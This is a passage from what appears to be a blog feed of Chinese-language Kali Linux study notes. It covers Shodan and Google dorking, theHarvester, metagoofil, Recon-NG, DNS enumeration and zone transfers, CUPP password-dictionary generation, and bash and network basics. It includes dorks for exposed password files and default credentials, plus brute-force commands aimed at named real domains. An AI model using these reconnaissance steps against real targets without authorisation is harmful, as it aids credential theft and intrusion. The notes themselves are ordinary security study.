【ProxyList】 （代理列表，在下面修改）</code></pre></blockquote>
<ul>
<li>配置代理链<ul>
<li><strong><code>🔺命令：proxychains nmap -p80 网段/24</code></strong>（可以用于不支持代理的软件）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十一)：搜索引擎（Google、ShoDan）</title>
    <url>/2019/12/09/kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%80)%EF%BC%9A%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%EF%BC%88Google%E3%80%81ShoDan%EF%BC%89/</url>
    <content><![CDATA[<hr>
<h4 id="1-搜索引擎（爬虫机器人爬取信息）"><a href="#1-搜索引擎（爬虫机器人爬取信息）" class="headerlink" title="1. 搜索引擎（爬虫机器人爬取信息）"></a>1. 搜索引擎（爬虫机器人爬取信息）</h4><ul>
<li>公司新闻动态</li>
<li>重要雇员信息</li>
<li>机密文档/网络拓扑</li>
<li>用户名密码</li>
<li>目标系统软硬件技术架构（Banner信息）</li>
</ul>
<h4 id="2-SHODAN"><a href="#2-SHODAN" class="headerlink" title="2. SHODAN"></a>2. SHODAN</h4><ul>
<li>搜索联网的设备（只搜索设备）</li>
<li>Banner：http、ftp、ssh、telnet</li>
<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li>
<li>常见filter（冒号作为定界符,空格为分节符）：<ul>
<li>net（192.168.20.1）</li>
<li>city</li>
<li>country（CN、US）</li>
<li>port（80、21、22、23）</li>
<li>OS</li>
<li>Hostname（主机或域名）</li>
<li>server</li>
<li>200 OK cisco country：JP</li>
<li>user：admin pass：password</li>
<li>linux upnp avtech</li>
</ul>
</li>
</ul>
<h4 id="3-SHODAN"><a href="#3-SHODAN" class="headerlink" title="3. SHODAN"></a>3. SHODAN</h4><ul>
<li>200 OK cisco country：JP</li>
<li>user:admin   pass:password</li>
<li>linux upnp avtech</li>
<li><a href="https://account.shodan.io/" target="_blank" rel="noopener">https://account.shodan.io/</a> （API Key为调用的API接口）</li>
<li><a href="https://www.shodan.io/explore" target="_blank" rel="noopener">https://www.shodan.io/explore</a> （搜索方式提供）</li>
<li>Add-Ons（Firefox的shadon插件）</li>
</ul>
<h4 id="4-GOOGLE搜索"><a href="#4-GOOGLE搜索" class="headerlink" title="4. GOOGLE搜索"></a>4. GOOGLE搜索</h4><ul>
<li>+充值-支付（含有充值，不含有支付的页面）</li>
<li>北京的电子商务公司–北京 intitle（标题部分）:电子商务 intext（页面正文部分）:法人 intext（页面正文部分）:电话</li>
<li>阿里网站上的北京公司联系人–北京 site:alibaba.com inurl:contact</li>
<li>塞班司法案的PDF文档–SOX filetype:pdf（doc,html等）</li>
<li>法国的支付相关页面–payment site（同country）:fr</li>
</ul>
<h4 id="5-GOOGLE搜索–实例"><a href="#5-GOOGLE搜索–实例" class="headerlink" title="5. GOOGLE搜索–实例"></a>5. GOOGLE搜索–实例</h4><ul>
<li>inurl:”level/15/exec/~/show”（网络设备开启http服务，15级服务，show服务）</li>
<li>intitle:”netbotz appliance” “ok”（机架设备，cameras APC公司，主要是机房）</li>
<li>inurl:/admin/login.php</li>
<li>inurl:qq.txt</li>
<li>filetype:xls “usename | password”</li>
<li>inurl:ftp “password” filetype:xls site:baidu.com（url是ftp）</li>
<li>inurl:service.pwd（FrontPage存在漏洞 → service.pwd）</li>
</ul>
<blockquote>
<pre><code>Google Hacking DataBase：http://exploit-db.com/google-dorks
Google、Bing等搜索引擎对来自同一个IP地址的搜索数量进行限制，进行自我保护</code></pre></blockquote>
<h4 id="6-YANDEX"><a href="#6-YANDEX" class="headerlink" title="6. YANDEX"></a>6. YANDEX</h4><ul>
<li>世界第四大搜索引擎–俄罗斯</li>
<li><a href="https://www.yandex.com/" target="_blank" rel="noopener">https://www.yandex.com/</a></li>
</ul>
<h4 id="7-用户信息"><a href="#7-用户信息" class="headerlink" title="7. 用户信息"></a>7. 用户信息</h4><ul>
<li>邮件、主机（▲2019.11.29theharvester commond not found）<ul>
<li><strong><code>🔺命令：theharvester -d 域名 -l（并发限制搜索结果数量） 300 -b 搜索引擎</code></strong></li>
<li><strong><code>🔺命令：vi /etc/proxychains</code></strong></li>
<li><strong><code>🔺命令：socks tor的监听端口（按照proxychains配置）</code></strong></li>
<li><strong><code>🔺命令：proxychains theharvester -d 域名 -l（并发限制搜索结果数量） 300 -b 搜索引擎</code></strong></li>
</ul>
</li>
<li>文件<ul>
<li><strong><code>🔺命令：metagoofil（google搜索） -d 域名 -t（文件类型） pdf -l（并发限制搜索结果数量） 200 -o （工作目录）test -f（输出文件） 1.html</code></strong></li>
<li><strong><code>🔺命令：proxychains metagoofil（google搜索） -d 域名 -t（文件类型） pdf -l（并发限制搜索结果数量） 200 -o （工作目录）test -f（输出文件） 1.html</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>tmux终端窗口的复用器，划分窗口大小 ▲2019.11.29未实验
tor可进行代理翻墙</code></pre></blockquote>
<h4 id="8-其他途径"><a href="#8-其他途径" class="headerlink" title="8. 其他途径"></a>8. 其他途径</h4><ul>
<li>社交网络</li>
<li>工商注册（法人、公司规模）</li>
<li>新闻组/论坛</li>
<li>招聘网站</li>
<li><a href="https://archive.org/web/" target="_blank" rel="noopener">https://archive.org/web/</a></li>
</ul>
<h4 id="9-个人专属的密码字典"><a href="#9-个人专属的密码字典" class="headerlink" title="9. 个人专属的密码字典"></a>9. 个人专属的密码字典</h4><ul>
<li>按个人信息生成其专属的密码字典</li>
<li>CUPP–Common User Password Profiler<ul>
<li><strong><code>🔺命令：git clone https://github.com/Mebus/cupp.git</code></strong></li>
<li><strong><code>🔺命令：python3 cupp.py -i</code></strong></li>
<li>进行简单的信息输入</li>
</ul>
</li>
</ul>
<h4 id="10-METADATA"><a href="#10-METADATA" class="headerlink" title="10. METADATA"></a>10. METADATA</h4><ul>
<li>Exif图片信息（图片记录GPS，照片生成时的信息）▲2019.11.29需要安装</li>
<li>Foca ▲2019.11.29未实验</li>
<li><strong><code>🔺命令：exiftool +图片.jpg</code></strong></li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十三)：Maltego</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%89)%EF%BC%9AMaltego/</url>
    <content><![CDATA[<hr>
<h4 id="1-MELTAGO"><a href="#1-MELTAGO" class="headerlink" title="1. MELTAGO"></a>1. MELTAGO</h4><ul>
<li>申请账号</li>
<li>登陆使用</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十二)：RECON-NG</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%8C)%EF%BC%9ARECON-NG/</url>
    <content><![CDATA[<hr>
<h4 id="1-RECON-NG（▲2019-11-30需自行安装moudles）"><a href="#1-RECON-NG（▲2019-11-30需自行安装moudles）" class="headerlink" title="1. RECON-NG（▲2019.11.30需自行安装moudles）"></a>1. RECON-NG（▲2019.11.30需自行安装moudles）</h4><ul>
<li><p>全特性的web侦擦框架（综合工具，模块去完成）</p>
</li>
<li><p>基于Python开发</p>
</li>
<li><p>Web信息搜索框架（通过google搜索引擎）</p>
</li>
<li><p>命令格式与msf一致（需熟练使用）</p>
</li>
<li><p>基于python开发</p>
</li>
<li><p>使用方法：</p>
<ul>
<li>模块（不同模块调用不同的搜索引擎，调用API接口）</li>
<li>数据库</li>
<li>报告</li>
</ul>
</li>
<li><p>全局选项</p>
<ul>
<li>recon-ng （进入default模块）</li>
<li>back（退回上一个模块）、exit（退出recon-ng）</li>
<li>add（向数据库插入表）、del   ▲2019.11.30 集成于keys</li>
<li>keys（framework API keys，搜索引擎的API）</li>
<li>load（自己编写的模块可以load进来） ▲2019.11.30 集成于modules</li>
<li>pdb（python的debug模式进行调试）</li>
<li>query（查询数据库，跟上标准SQL语言） ▲2019.11.30 集成于db</li>
<li>record（在recon-ng下的命令进行记录，-r参数进行调用） ▲2019.11.30 修改为script</li>
<li>reload（修改模块后可以reload） ▲2019.11.30 集成于modules</li>
<li>resourece（在框架下可以用-r调用recond文件）▲2019.11.30删除此模块</li>
<li>search（seach相关的模块有哪些） ▲2019.11.30 集成于marketplace</li>
<li>set（设置选项） ▲2019.11.30 集成于options</li>
<li>shell（在框架下执行shell 命令）</li>
<li>show（显示当前框架的各种信息）</li>
<li>snapshots（快照）</li>
<li>spool（资源池划分，也可以导出）</li>
<li>unset（清楚设置） ▲2019.11.30 集成于options</li>
<li>use（使用各种模块） ▲2019.11.30 删除此模块</li>
<li>workspaces（管理工作区）</li>
</ul>
</li>
<li><p>recon-ng -h</p>
<ul>
<li>-h（help选项）</li>
<li>-v（version版本）</li>
<li>-w（load/create a workspace）</li>
<li>-r filename（workspace，创建一个工作区）</li>
<li>–no-check（disable version check）</li>
<li>–no-analytics（disable analytics reporting，不检查报告模块）</li>
</ul>
</li>
<li><p>recon-ng -w（创建工作区） sina</p>
</li>
<li><p>workspaces list（查看工作区）</p>
</li>
<li><p>keys list（支持网站api）</p>
</li>
<li><p>keys add API类型 具体API</p>
</li>
<li><p>marketplace search google</p>
</li>
<li><p>shell ls</p>
</li>
<li><p>show options（当前可以option选项）</p>
</li>
<li><p>options set PROXY 127.0.0.1 8087（设置代理）</p>
</li>
<li><p>options set USER-AGETN “某一浏览器的字段”</p>
</li>
<li><p>unset USER-AGENT（清空设置）</p>
</li>
<li><p>snapshots take（作一次snapshots快照）</p>
</li>
<li><p>snapshots load（使用以前的快照）</p>
</li>
</ul>
<blockquote>
<pre><code>recon-ng两下Tab键可以看到所有的命令
全局模式下的options：DEBUG、NAMESERVER、PROXY、THREADS、TIMEOUT、USER-AGENT、VERBOSE
DEBUG--python的debug调试
NAMESERVER--域名解析服务器
PROXY--代理 ▲2019.11.30代理暂无法使用
THREADS--线程，搜索引擎有保护机制
TIMEOUT--超时
USER-AGENT--需要进行伪装，user-agent字段</code></pre></blockquote>
<ul>
<li><p>use 模块（harketarget模块可用）</p>
<ul>
<li>DNS查询</li>
</ul>
<ol>
<li>Google</li>
<li>Baidu</li>
<li>Bing</li>
<li>Yahoo</li>
<li>Brute force</li>
</ol>
</li>
</ul>
<blockquote>
<p>   Google模式 ▲2019.11.30模块暂不可用</p>
<ol>
<li>marketplace search google</li>
<li>modules load recon/domains-hosts/google_site_web（也可以使用api）</li>
<li>show options</li>
<li>show info</li>
<li>options set SOURCE 域名</li>
<li>run</li>
<li>show hosts/query select * from hosts</li>
</ol>
</blockquote>
<blockquote>
<p>   bing模式 ▲2019.11.30模块暂不可用</p>
<ol>
<li>marketplace search bing</li>
<li>modules load recon/domains-hosts/bing_site_web</li>
<li>show options</li>
<li>options set SOURCE 域名</li>
<li>run</li>
<li>query select * from hosts where host like ‘%www%’（复杂sql查询）</li>
</ol>
</blockquote>
<blockquote>
<p>   brute模式（不解析IP地址）</p>
<ol>
<li>marketplace search brute</li>
<li>modules load recon/domains-hosts/brute_hosts</li>
<li>show options</li>
<li>options set SOURCE/WORDLIST  </li>
<li>run</li>
</ol>
</blockquote>
<ul>
<li>use 模块（harketarget模块可用）<ul>
<li>解析IP地址（查询数据库，存在负载均衡）</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>marketplace search resolve</li>
<li>modules load recon/hosts-hosts/resolve</li>
<li>show options</li>
<li>show info</li>
<li>options set SOURCE query select host from hosts where host like ‘%sina.com.cn%’</li>
<li>show hosts</li>
<li>options set SOURCE query select host from hosts</li>
<li>show hosts</li>
</ol>
</blockquote>
<ul>
<li>use 模块（harketarget模块可用）<ul>
<li>联系人</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>marketplace search contact</li>
</ol>
</blockquote>
<ul>
<li>use 模块（harketarget模块可用）<ul>
<li>报告</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>marketplace search report</li>
<li>modules load reporting/html</li>
<li>show options</li>
<li>options set CREATOR 创建者</li>
<li>options set CUSTOMER 客户</li>
<li>options set FILENAME 路径</li>
<li>options set SANITIZE TRUE（是否对私密消息进行mask）</li>
</ol>
</blockquote>
<ul>
<li>use 模块（harketarget模块可用）<ul>
<li>API</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十)：DNS信息收集</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81)%EF%BC%9ADNS%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<hr>
<h4 id="1-信息收集-DNS"><a href="#1-信息收集-DNS" class="headerlink" title="1. 信息收集-DNS"></a>1. 信息收集-DNS</h4><ul>
<li>域名解析成IP地址<ul>
<li>域名（qq.com）与FQDN（完全限定域名<a href="http://www.qq.com）的区别" target="_blank" rel="noopener">www.qq.com）的区别</a></li>
<li>域名记录：A（IPV4主机记录）、C name（别名记录）、NS（域名服务器地址对域解析）、MX（邮件服务器地址对域解析）、ptr（通过IP地址反向解析域名）、text（spf反向垃圾邮件域名）、SOA（启始授权）、AAAA（IPV6地址）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>DNS客户端 → 本地DNS服务器 → 根域服务器 → com服务器 → example.com服务器
1.递归查询（一轮一轮递归） 2.迭代查询（从顶至下）
缓存DNS服务器本身并不包含DNS记录（常用于本地DNS服务器）
spf 反向垃圾域名服务，判断邮件的域名是否伪造</code></pre></blockquote>
<h4 id="2-DNS信息收集-NSLOOKUP"><a href="#2-DNS信息收集-NSLOOKUP" class="headerlink" title="2. DNS信息收集-NSLOOKUP"></a>2. DNS信息收集-NSLOOKUP</h4><ul>
<li><strong><code>🔺命令：nslookup 域名</code></strong></li>
<li><strong><code>🔺命令：nslookup set type=mx（查询类型） 域名</code></strong> （数值越小，优先级越高）</li>
<li><strong><code>🔺命令：nslookup set type=ns 域名</code></strong></li>
<li><strong><code>🔺命令：nslookup set type=ptr ip地址</code></strong> ▲2019.11.27反向域名解析大概率查不到</li>
<li><strong><code>🔺命令：nslookup server 202.106.0.20（其他ISP域名服务器的ip地址）</code></strong></li>
</ul>
<blockquote>
<pre><code>网络为智能DNS，选取最近的DNS服务器，不同地址的DNS服务器是不一样的，边缘网络</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：nslookup set type=any（任何域名）域名</code></strong></li>
</ul>
<h4 id="3-DNS信息收集-DIG"><a href="#3-DNS信息收集-DIG" class="headerlink" title="3. DNS信息收集-DIG"></a>3. DNS信息收集-DIG</h4><ul>
<li><strong><code>🔺命令：dig 8.8.8.8 域名 mx</code></strong></li>
<li><strong><code>🔺命令：dig 域名 any</code></strong></li>
<li>带参数：<strong><code>🔺命令：dig +noall +answer 域名 any | awk &#39;{print $5}&#39;</code></strong>▲2019.11.27难以查到</li>
<li>反向查询：<strong><code>🔺命令：dig -x ip地址（PTR）</code></strong></li>
<li>bind版本信息：<strong><code>🔺命令：dig +noall +answer txt chaos（class类） VERSION BIND 域名</code></strong> ▲2019.11.27难以查到</li>
<li>DNS追踪：<strong><code>🔺命令：dig +trace 域名</code></strong>（迭代查询）、<strong><code>🔺命令：dig 域名（递归查询）</code></strong></li>
</ul>
<blockquote>
<pre><code>指定域名服务器查询域名
1.nslooup www.sina.com -type=a 8.8.8.8
2.dig www.sina.com any @8.8.8.8
trace追踪域名
本机（随机挑选root的IP地址） → root（随机挑选com的IP地址） → com（随机挑选sina.com的IP地址） → sina.com（随机挑选IP地址） → www.sina.com（挑选A记录）
▲抓包分析递归查询和迭代查询的区别
▲域名解析服务器跟域名后缀可以不同（top. → d.zdnscloud.com.）</code></pre></blockquote>
<h4 id="4-DNS区域传输（DNS的同步机制）"><a href="#4-DNS区域传输（DNS的同步机制）" class="headerlink" title="4. DNS区域传输（DNS的同步机制）"></a>4. DNS区域传输（DNS的同步机制）</h4><ul>
<li><strong><code>🔺命令：dig ns1.example.com example.com axfr（差异化传输方法Request for full zone transfer）</code></strong></li>
<li><strong><code>🔺命令：host -T（用TCP传输方式） -l（axfr） sina.com ns3.sina.com</code></strong></li>
</ul>
<blockquote>
<pre><code>TCP用于DNS之间的域名传输
UDP用于DNS之间的查询</code></pre></blockquote>
<h4 id="5-DNS字典爆破"><a href="#5-DNS字典爆破" class="headerlink" title="5. DNS字典爆破"></a>5. DNS字典爆破</h4><ul>
<li><strong><code>🔺命令：fierce -dnsserver（指定DNS服务器） 8.8.8.8 -dns（要查询的域） sina.com.cn -wordlist（字典，明确字典路径） a.txt</code></strong></li>
<li><strong><code>🔺命令：dnsdict6 -d（显示IPV6）4（显示IPV4） -t（并发线程数） 16 -x（不同级别） sina.com  （-D 自己指定字典，-U 最大的字典）</code></strong></li>
<li><strong><code>🔺命令：dnsenum -f（字典，明确字典路径） dnsbig.txt -dnsserver 8.8.8.8 sina.com -o（导出成一个文件） sina.xml</code></strong></li>
<li><strong><code>🔺命令：dnsmap sina.com -w（字典，明确字典路径） dns.txt</code></strong></li>
<li><strong><code>🔺命令：dnsrecon -d（指定域名服务器） sina.com --lifetime（超时时间）10 -t（查询强度） brt（暴力爆破） -D（字典，明确字典路径） dnsbig.txt</code></strong></li>
<li><strong><code>🔺命令：dnsrecon -t std（标准爆破） -d sina.com -D（字典，明确字典路径） dnsbig.txt</code></strong></li>
</ul>
<blockquote>
<pre><code>查看程序相关文件
dpkg -L fierce
find / -name dnsenum</code></pre></blockquote>
<h4 id="6-DNS注册信息"><a href="#6-DNS注册信息" class="headerlink" title="6. DNS注册信息"></a>6. DNS注册信息</h4><ul>
<li><strong><code>🔺命令：whois 域名</code></strong></li>
<li><strong><code>🔺命令：whois IP地址</code></strong></li>
<li><strong><code>🔺命令：whois -h whois.apnic.net IP地址</code></strong></li>
</ul>
<blockquote>
<pre><code>网页查询
AFRINIC  http://www.afrinic.net
APNIC    http://www.apnic.net
ARIN     http://whois.arin.net
IANA     http://www.iana.com 
ICANN    http://www.icann.org
LACNIC   http://www.lacnic.net
NRO      http://www.nro.net
RIPE     http://www.ripe.net
InterNic http://www.internic.net</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三)：环境、环境配置</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89)%EF%BC%9A%E7%8E%AF%E5%A2%83%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<hr>
<h4 id="1-熟悉环境"><a href="#1-熟悉环境" class="headerlink" title="1. 熟悉环境"></a>1. 熟悉环境</h4><ul>
<li>登陆密码</li>
<li>Top10安全工具<ul>
<li>aircrack-ng（wifi无线渗透）</li>
<li>hydra，john（密码破解）</li>
<li>burpsuit（web渗透）</li>
<li>maltego（信息收集）</li>
<li>metasploit framework（渗透测试框架，跟kail同个水平）</li>
<li>nmap（网络发现层的扫描器）</li>
<li>owasp-zap（web渗透测试工具）</li>
<li>sqlmap（sql注入工具，python语言开发）</li>
<li>wireshark（抓包分析工具）</li>
</ul>
</li>
<li>字体调整<ul>
<li><strong><code>🔺命令：gnome-tweak-tool</code></strong></li>
</ul>
</li>
<li>监视网络流量<ul>
<li><strong><code>🔺命令：apt-get install netspeed</code></strong>（2.0版本得上官网下载）</li>
</ul>
</li>
</ul>
<blockquote>
<p>新的安装方式：<a href="https://blog.csdn.net/coding_or_dead/article/details/53523596" target="_blank" rel="noopener">https://blog.csdn.net/coding_or_dead/article/details/53523596</a></p>
</blockquote>
<blockquote>
<p>扩展在software中，可以看到Extension setting</p>
</blockquote>
<ul>
<li>监视网络流量<ul>
<li>按住alt，右键添加网络流量监视（显示字节形式）</li>
</ul>
</li>
<li>强行终止程序<ul>
<li>按住alt，右键添加强制退出</li>
</ul>
</li>
<li>文件目录</li>
</ul>
<blockquote>
<p>/medir /mnt 都可以挂载目录，个人使用习惯</p>
</blockquote>
<ul>
<li>共享文件</li>
</ul>
<h4 id="2-熟悉BASH命令"><a href="#2-熟悉BASH命令" class="headerlink" title="2. 熟悉BASH命令"></a>2. 熟悉BASH命令</h4><blockquote>
<pre><code>终端界面为一个Shell,用户与系统交互的一个通道
A shell、B shell（kali默认）、D shell</code></pre></blockquote>
<ul>
<li>ls(查看文件)<ul>
<li>ls -l 查看常规格式显示文件信息 </li>
<li>ls /dev -l 目录第一个参数基本涵盖</li>
<li>ls -a 显示所有文件信息（显示隐藏文件）</li>
<li>ls -lh 以容易阅读的方式显示文件大小</li>
<li>ls -lh –sort=size 以大小进行排序</li>
<li>ls -lh –sort=time 以时间进行排序</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>第一个参数属性：
c--表示一个字符型设备
d--表示一个目录
l--表示一个链接，类似于window里面的快捷方式
b--表示一个块设备，block，硬盘分区sda</code></pre></blockquote>
<ul>
<li>cd（进入某个目录）<ul>
<li>cd . 当前目录</li>
<li>cd .. 当前目录的上一级目录</li>
</ul>
</li>
<li>pwd（查看当前工作目录）</li>
<li>cat（查看日志文件内容）<ul>
<li>cat /var/log/message（系统改变的信息）</li>
</ul>
</li>
<li>more(查看系统变化信息，下一屏幕通过Enter，q退出，同cat)</li>
<li>less(查看文件，跟more命令基本一样，同cat)</li>
<li>tail(默认显示最下面10行的内容，同cat)<ul>
<li>tail -20（查看最下面二十行）</li>
</ul>
</li>
<li>watch -n 指定进程 tail -行数 文件（watch和tail的联合）</li>
<li>cp（对文件进行复制）<ul>
<li>cp 文件名1 文件名2</li>
<li>cp -r 目录1 目录2</li>
</ul>
</li>
<li>rm（删除文件）<ul>
<li>rm 文件名</li>
<li>rm -r 目录名</li>
</ul>
</li>
<li>top(监视linux系统性能参数，每隔几秒钟进行更新，q退出)<ul>
<li>kill 进行PID（在top界面）</li>
</ul>
</li>
<li>ps（查看进程信息）<ul>
<li>ps -ef（查看进程详细信息，PPID父进程）</li>
<li>ps aux（同-ef显示项目相同，显示列信息稍微不同）</li>
</ul>
</li>
<li>grep（筛选输出内容）<ul>
<li>grep 所查内容 路径（例如：grep ssh /etc/passwd）</li>
</ul>
</li>
<li>ifconfig（查看当前网络配置信息）<ul>
<li>ifconfig 网卡 down（关闭网卡，macchanger -m 新MAC地址 网卡）</li>
</ul>
</li>
<li>netstat（查看网络连接信息）<ul>
<li>netstat -pantu（查看计算机与服务器产生的TCP、UDP连接）</li>
<li>netstat -pantu | egrep -v ‘0.0.0.0’| awk ‘{print $5}’</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>netstat -pantu | egrep -v &#39;0.0.0.0&#39;| awk &#39;{print $5}&#39; | cut -d &#39;:&#39; -f 1| egrep -v &#39;And&#39;| egrep -v &#39;Address&#39; | sort | uniq &gt; ip(文件)
awk--只显示（$列数）的数据，以空格作为间隔
sort--排序
cut--同egrep，分隔
uniq--把重复的内容只显示一次</code></pre></blockquote>
<ul>
<li>route(路由，网络信息)</li>
<li>mount（挂载文件夹，可本地可远程）<ul>
<li>mount -o loop iso文件 路径</li>
</ul>
</li>
<li>dmesg(查看messages文件内容，同tail，但不需要路径)</li>
<li>find（查找文件，目录）<ul>
<li>find 查找开始位置 -name “文件名称”（区分大小写）</li>
<li>find 查找开始位置 -iname “文件名称”（不区分大小写） </li>
<li>find .（当前目录） -name “文件名+通配符”</li>
<li>find .（当前目录） -name “文件名+通配符” -exec cp () /路径/{}.bak ;（隐藏目录不操作）</li>
</ul>
</li>
<li>whereis（系统数据库搜索路径，需要通过本地包安装，不可源码安装） <ul>
<li>whereis -b 文件名（查看二进制文件）</li>
<li>updatedb（更新whereis的数据库）</li>
</ul>
</li>
<li>echo（在当前终端窗口显示信息）</li>
<li>vi（文本编辑器）<ul>
<li>vi 目标文件（编辑目标文件）</li>
<li>：set number（显示行号）</li>
<li>：wq（写入退出）</li>
<li>i（插入模式）</li>
<li>esc（退出模式）</li>
<li>dd（删除一整行）</li>
<li>o（插入一行）</li>
<li>Y（复制）,T（黏贴）</li>
</ul>
</li>
</ul>
<h4 id="3-管道"><a href="#3-管道" class="headerlink" title="3. 管道"></a>3. 管道</h4><ul>
<li>cat /varc/log/messages | grep ssl</li>
<li>cd aaa &amp; ls （前后两个命令依次执行）</li>
<li>cd aaa &amp;&amp; ls（如果前面执行成功，才执行后面的命令）</li>
<li>cd aaa || ls（如果前面执行不成功，才去执行后面的命令）</li>
</ul>
<h4 id="4-shell脚本"><a href="#4-shell脚本" class="headerlink" title="4. shell脚本"></a>4. shell脚本</h4><ul>
<li>1.sh<ul>
<li>chmod =x 1.sh</li>
<li>./1.sh</li>
</ul>
</li>
</ul>
<pre><code>#!/bin/bash
echo -n &#39;IP:&#39;&#39;  //-n光标不换行
read ip
echo &#39;your ip is:&#39; $ip  </code></pre><ul>
<li>99.sh<ul>
<li>chmod =x 99.sh</li>
<li>./99.sh</li>
</ul>
</li>
</ul>
<pre><code>#!/bin/bash
for n in `seq 9`  //9的序列
do
   for m in `seq $n`
   do
   echo -n &quot;$m*$n=&quot; `expr $m \ * $n`&quot; &quot;
   done
 echo
done</code></pre><ul>
<li>ping.sh(活着的ip地址)<ul>
<li>chmod -x ping.sh</li>
<li>./ping.sh</li>
</ul>
</li>
</ul>
<pre><code>#!/bin/bash
for n in `seq 254`
do
   ping 192.168.100.$n -c 1 | grep ttl | awk &#39;{print $4}&#39;| awk -F: &#39;{print $1}&#39;
done</code></pre><ul>
<li>s1.sh(需要一个扫描预文件ip1)▲还未实现<ul>
<li>chmod -x s1.sh</li>
<li>./s1.sh</li>
</ul>
</li>
</ul>
<pre><code>#!/bin/bash
A=&#39;cat ip1&#39;
for B in $A
do
   n=&#39;echo $B | wc -L&#39;
   if [ $n -gt 6 ] ; then
      ip=$B
   else
       port=$B
       namp -p$port -sV $ip | grep -v Starting | grep -v Host | grep -v PORT | grep -v Service | grep -v done &gt;&gt; r1
       fi
done</code></pre><h4 id="5-网路配置-1"><a href="#5-网路配置-1" class="headerlink" title="5. 网路配置-1"></a>5. 网路配置-1</h4><ul>
<li>临时IP地址（重启后不生效,在临时设置有时间限制，大约30s连接时间）<ul>
<li><strong><code>🔺命令：dhclient eth0</code></strong>（自动获取IP地址）</li>
<li><strong><code>🔺命令：ifconfig eth0 192.168.100.x/24</code></strong>（指定一个IP地址）</li>
<li><strong><code>🔺命令：route add default gw 192.168.100.1</code></strong>（添加默认网关，缺省网关）</li>
<li><strong><code>🔺命令：netstat -pantu</code></strong>（查看IP网关信息）</li>
<li><strong><code>🔺命令：route add -net 172.16.0.0/24（vlan的ip地址） gw 192.168.100.x eth0</code></strong>（vlan 配置）</li>
<li><strong><code>🔺命令：echo nameserver 8.8.8.8&gt;/etc/resolv.conf</code></strong>（vi /etc/resolv.conf修改域名服务器）</li>
</ul>
</li>
<li>固定IP地址（重启后生效）<ul>
<li>cat /etc/network/interfaces</li>
<li>auto eth0</li>
<li>iface eth0 inet static</li>
<li>address 192.168.100.x（本机IP地址）</li>
<li>netmask 255.255.255.0（子网掩码）</li>
<li>network 192.168.100.0（网络地址，可不配置）</li>
<li>broadcast 192.168.100.255（广播地址，可不配置）</li>
<li>gateway 192.168.100.x（网关地址）</li>
<li>dns-nameservers 192.168.100.x（可写多个）</li>
<li>uproute add-net 172.16.2.0/24 gw 192.168.100.x eth1 （添加内部地址，静态路由）</li>
<li>down route del-net 172.168.2.x/24（电脑关闭的时候，关闭静态理由）</li>
</ul>
</li>
</ul>
<h4 id="6-更新升级"><a href="#6-更新升级" class="headerlink" title="6. 更新升级"></a>6. 更新升级</h4><ul>
<li><strong><code>🔺命令：apt-get update --fix-missing</code></strong>（不是更新工具包，是更新软件包的网络索引，通过后面的参数可以把有问题的索引删除）<ul>
<li>科技大学更新源（vi /etc/apt/source.list）▲源的地址无法找到</li>
<li>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali main non-free contrib</li>
<li>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali main non-free contrib</li>
<li>deb <a href="http://mirrors.ustc.edu.cn/kali-security" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali-security</a> kali/updates main contrib non-free</li>
</ul>
</li>
<li><strong><code>🔺命令：apt-get upgrade</code></strong>(更新实际软件包文件)</li>
<li><strong><code>🔺命令：apt-get dist-upgrade</code></strong>(大版本的更新)</li>
<li>重复执行</li>
</ul>
<h4 id="7-安装软件包"><a href="#7-安装软件包" class="headerlink" title="7. 安装软件包"></a>7. 安装软件包</h4><ul>
<li>库<ul>
<li>Apt-get命令（也可通过–fix-missing）</li>
</ul>
</li>
<li>安装适合自己的工具软件<ul>
<li>smplayer（媒体播放器）</li>
<li>ibus ibus-pinyin（中文输入法）</li>
<li>flashplugin-nonfree（浏览器flash插件）▲2019.11.22浏览器自带，2020年底将淘汰</li>
<li>gdebi（方便使用图形化界面安装deb）</li>
<li>amule、qbittorrent（磁力下载）</li>
<li>geany（程序开发环境）</li>
<li>stardict（英文字典，翻译软件）</li>
<li>meld（用来文件差异比较的软件）</li>
<li>ttf-wqy-microhei（字体）</li>
<li>kchmviewer（打开chm文件，微软帮助文件）</li>
<li>freemind（头脑风暴软件，思维导图）</li>
<li>netspeed（网络连接速度监视小工具）</li>
